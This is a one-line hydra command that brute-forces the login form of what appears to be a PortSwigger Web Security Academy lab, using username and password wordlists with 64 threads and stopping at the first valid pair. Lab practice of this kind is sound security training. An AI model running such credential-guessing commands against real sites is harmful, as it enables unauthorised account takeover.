hydra 0a570091038931a082005c8f00ed00c6.web-security-academy.net  -L u.txt -P p.txt https-post-form \
"/login:username=^USER^&password=^PASS^:F=Invalid username or password." -f -t 64 -I
